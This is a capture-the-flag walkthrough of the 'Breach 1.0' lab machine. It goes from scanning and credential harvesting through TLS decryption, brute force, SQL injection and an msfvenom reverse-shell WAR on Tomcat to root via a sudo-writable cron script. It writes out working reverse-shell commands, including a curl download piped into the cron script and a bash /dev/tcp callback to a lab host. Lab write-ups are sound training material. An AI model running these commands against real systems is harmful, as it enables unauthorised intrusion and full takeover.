# Breach 1.0 git

# 1 Information gathering
## 1.1 Host discovery
`nmap -n -Pn -F 192.168.110.1/24 -oN host_discovery.txt`

![f444ff308f1006daa005e990e4538db6.png](./_resources/917ae34a3db84b0f9c0f7bdbb8af3532.png)

Apparently all ports are open. It maybe means that there is a IDS.
Instead run a scan for get banners, we can access a common port (80 - web).

## 1.2 80 Web
### 1.2.1 Gobuster enum dir and files
`gobuster dir -u http://192.168.110.140 -w /usr/share/wordlists/dirb/big.txt -t 50 -x php,bkp,bak,txt,html,aspx -f -o info-slash.txt`

`gobuster dir -u http://192.168.110.140 -w /usr/share/wordlists/dirb/big.txt -t 50 -x php,bkp,bak,txt,html,aspx -o info.txt`

### 1.2.2 Index page source code with an user/password
![4862e42fa2278e90f0abd1dff9179bee.png](./_resources/eb5d1e9e39fd4ea6877b51fca0d9d038.png)
![08bd670a22cebbc95c8ac9fc3c905041.png](./_resources/00ad64a4c4c943f39f1000a3753af43b.png)

A possible login and password inside a base64 inside base64 and other .html file to access.

`pgibbons:damnitfeel$goodtobeagang$ta`

### 1.2.3 Some images and a metametada with an user/password (comments), extracted with exiftool
![5db831eea4d81b401c69534a9a4b65cf.png](./_resources/fadc7019bf37452c9bae2ea9ca463159.png)

There's a possible password in a comment: coofeestains


### 1.2.4 Page named initech.html with employee portal
![2061a4bd0d691139ba955e948060573c.png](./_resources/76c9dce19612449584e766bce56ca870.png)

Employee portal:

![3c3d08b3d7c231e5004c5852bdfbd630.png](./_resources/937a15fa630d46b6ad7b43c1371e9c13.png)

And in it we can use the previously credentials and login:

![2cb7d4dfa119a0df98c0a4490a84830e.png](./_resources/89b374dc929c4d88bdd10ccdc7988554.png)

#### 1.2.4.1 Possible exploits with admin credentials and others
![d6f2c85e6b6b622579c24555c64fe6bf.png](./_resources/741f813a566d42a3b194dddf6b4bce23.png)

#### 1.2.4.2 Reading e-mails
Is possible to read some e-mails:

![74a18ccfa825a642e702dea607845c7d.png](./_resources/540d47c4fc5544398c147394b2594e9a.png)

There's a .keystore file as the message says:

![67e9ff3054aca8bfea9938f581798f80.png](./_resources/35e6534134e04eef885a4c7492bc0337.png)
	
Other e-mail with good informations is that which Bill sent to Peter:

![8e00c7821a3616b9d97321c32e3649fd.png](./_resources/617525e642f34bc5a9769de576aa2e37.png)

#### 1.2.4.3 Possible administration portal
![4fde7f656be6451fcb5470d0f556d367.png](./_resources/fb1e333129654d64aa62cc3b83c9eeee.png)
Here we have a password and a pcap file.
Password: tomcat

File: http://192.168.110.140/impresscms/_SSL_test_phase1.pcap

#### 1.2.4.4 .keystore file - reading https traffic
It's a java keystore:

![e3d5638187e84a5a7de5d6313e4be92a.png](./_resources/9365c918d37b4336a5d3db979c96df8e.png)

here I have a short reference to understand basically:

https://en.wikipedia.org/wiki/Java_KeyStore <- for basic undesrtand

https://dzone.com/articles/extracting-a-private-key-from-java-keystore-jks <- from understand how to extract it

Basically it's a repository of security certificates in some java format and we can abuse it:

`keytool -importkeystore -srckeystore .keystore -destkeystore keystore.p12 -deststoretype PKCS12 -srcalias tomcat -deststorepass tomcat -destkeypass tomcat`

`openssl pkcs12 -in keystore.p12 -nodes -nocerts -out key.pem`
![77ed95b68184d2e6602c256c621809c1.png](./_resources/7917d431e95b473aaa1e08f0864405ce.png)


# 2 Exploitation
## 2.1 Burpsuite (Intruder) and SQL injection
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt

After trying a brute-force with Burpsuit (Intruder) and a nice short list of usernames and the fond possible password extracted in the metadata, it returns okay:

![93b2ac62a3134912c9bc2c7a3cb609fc.png](./_resources/329a0426aee94e0c9ecf76d24bb04bc6.png)

`admin:coffeestains`

### 2.1.1 Admin panel
![4b8c1d9278e0aab21fa40c70633685e2.png](./_resources/97d16be084484fa993303969ee19bbb2.png)

Here we found a sql injection based on previously possible exploit:

https://github.com/byth22/Exploits/blob/main/Web/timeSqli-query_sleep.py

![c59ba3edbe322b03755560c7beff37be.png](./_resources/4329da5b8c624523b15d8340cb503890.png)

It needs to be captured with burpsuit, saved as request and pointed to in sqlmap:

`sqlmap -r breach1.0.post --is-dba --level=3`

![014d3bb1532a3c7236fbc80f96be0797.png](./_resources/deabeee8cea54557bc7258ba3bf89767.png)

![b61fd933acd22545dc6475eacfe81bb3.png](./_resources/1e5d98a6ff2a4a40a298f019cd6c02b9.png)

And without success exploiting it, the only useful info is that the user is dba.

#### 2.1.1.1 Python code to exploit Time-based SQL Injection

Other way to exploit without using Sqlmap is to code an exploit in python as POC to check if it's dba/root.
Exploit link: https://github.com/byth22/Exploits/blob/main/Web/timeSqli-query_sleep.py

Exploiting:

![1658cf9f9a2e76a4fe5054ab0acb9e4d.png](./_resources/ce0827a92220432a973deee03425aad2.png)


## 2.2 Reading encrypted site navigation with wireshark and ssl cert extracted from found .keystore.
https://packetpushers.net/using-wireshark-to-decode-ssltls-packets/ <- method to decrypt

### 2.2.1 Reading .pcap with Wireshark
And opening this .pcap, we can observe that there's a web server running on port 8443 (item 6):

![073b99715c9df1c4490beaf1425b2f1e.png](./_resources/431a02c559534054bc7ca0d172275be4.png)

Make note that the connect starts on item 5 on port 8443 and after call the TLS - Client Hello. That means there might actually be an encrypted web connection. We can try to decrypt.

1. -> edit -> preferences -> RSA keys -> add new key file -> select your .pem file.
2. you need to re-open your .pcap file.

And now is possible to read it:

1. -> select item 6 for options -> follow -> TLS stream:
2. 
![026d2bddb679424163bcb4691d5584f5.png](./_resources/769bd7f0eb104d02ac9515320094f83c.png)

Indeed there is a web connection using tomcat and WWW-Authenticate (basic auth).

Looking some more we can see an basic authorization "key" in basic64. We can decrypt it:
```
Authorization: Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC
```
```
echo "dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC" | base64 -d
```
![e5d202e2bf8babb6fc78571b03b0d5de.png](./_resources/39fc6f254483439596f3f05048749f6b.png)

tomcat:Tt\5D8F(#!*u=G)4m7zB 

## 2.3 Accesing and exploiting Application Manager (tomcat)
At first, navigating the site seemed impossible with Kali's firefox-esr. The ssl configrations appears very insecure:

![ff1e41f5f0dd982982384ca22522aec1.png](./_resources/7a17353757ac43f298b4783a0bc75fce.png)

Using `sslyze` to analying some cypher configurations, it returns that all ssl versions is rejected when is used from 
cipher tools and consequently in the browser too.

The option was to use the Burpsuit as a proxy to bypass this block.

Url acessada: https://192.168.110.140:8443/_M@nag3Me/html

![f697f6146754bf9dbd3bea4d438d3942.png](./_resources/11594bb3429d430bab6bd7fb44d3815b.png)

Generating payload:

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.4 LPORT=4446 -f war > runme.war`

I uploaded the file and hit the link:
```
rlwrap nc -lvp 4446
listening on [any] 4444 ...
192.168.110.140: inverse host lookup failed: Unknown host
connect to [192.168.110.4] from (UNKNOWN) [192.168.110.140] 45186
id
uid=104(tomcat6) gid=112(tomcat6) groups=112(tomcat6)
python -c 'import pty;pty.spawn("/bin/bash")'
```

# 3 Post-exploitation
## 3.1 Abusing mysql without password
We have two users looking at the initial path:

* milton
* blumbergh

Recalling as proven by SQL injection that the CMS was using the MySQL root user, it tries to connect without password and it works.

There's a system user with its hash:
```
mysql> SELECT User,Password from mysql.user;
+------------------+-------------------------------------------+
| User | Password |
+------------------+-------------------------------------------+
| root | |
| milton | 6450d89bd3aff1d893b85d3ad65d2ec2 |
+------------------+-------------------------------------------+
```

After use crackstation tool:
`thelaststraw`

Now we su to the milton system user with the previous password.
`milton@Breach:~$`

Checking id:
```
milton@Breach:~$ id 
uid=1000(milton) gid=1000(milton) groups=1000(milton),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin) ,111(sambashare)
```

Let's find some files with adm group permissions:
```
find / -group adm
/var/log/mysql.log
/var/log/apt/term.log.1.gz
/var/log/apt/term.log
/var/log/dmesg
/var/log/mysql
/var/log/syslog
/var/log/auth.log
/var/log/tomcat6
...
```

There's good information on it (/var/log/syslog):
```
Jun 27 09:12:01 Breach CRON[2883]: (root) CMD (/usr/share/cleanup/tidyup.sh)
Jun 27 09:15:01 Breach CRON[2889]: (root) CMD (/usr/share/cleanup/tidyup.sh)
Jun 27 09:18:01 Breach CRON[2897]: (root) CMD (/usr/share/cleanup/tidyup.sh)
```

A cronjob run every 3 minutes by root, but it's not writable:

`-rwxr-xr-x 1 root root 174 Jun 26 21:49 tidyup.sh`

Leets look it:
```
#!/bin/bash

#Hacker Evasion Script
#Initech Cyber Consulting, LLC
#Peter Gibbons and Michael Bolton - 2016
#This script is set to run every 3 minutes as an additional defense measure against hackers.

cd /var/lib/tomcat6/webapps && find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf
```

Called on a regular basis as a cronjob, apparently it deletes all files in a specific directory (swingline).
Without ways to exploit with our current user (no write perm), we can focus on the other user called blumbergh.

Using the password found earlier in the imagem metadata with the user blumbergh, its possible to log in:
```
milton@Breach:~$ su - blumbergh
Password: coffeestains

blumbergh@Breach:~$
```

## 3.2 Getting root with bad permission, crontab and sudo
Enumerating sudo commands:

```
blumbergh@Breach:~$ sudo -l
blumbergh ALL=(root) NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh
```

Bash reverse shell:
```
 cat reverse.bash
 #!/bin/bash
 . /etc/profile
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 export SHELL=/bin/bash
 /bin/bash -i >& /dev/tcp/192.168.110.104/4447 0>&1
```

Let's download the reverse shell and put it in tidy.sh:
```
curl http://192.168.110.104/reverse.bash | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh
```

Now we are root:
```
root@tsz:/var/www/html# nc -lvp 4447
listening on [any] 4447 ...
192.168.110.140: inverse host lookup failed: Unknown host
connect to [192.168.110.104] from (UNKNOWN) [192.168.110.140] 34612
bash: cannot set terminal process group (2969): Inappropriate ioctl for device
bash: no job control in this shell
root@Breach:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```
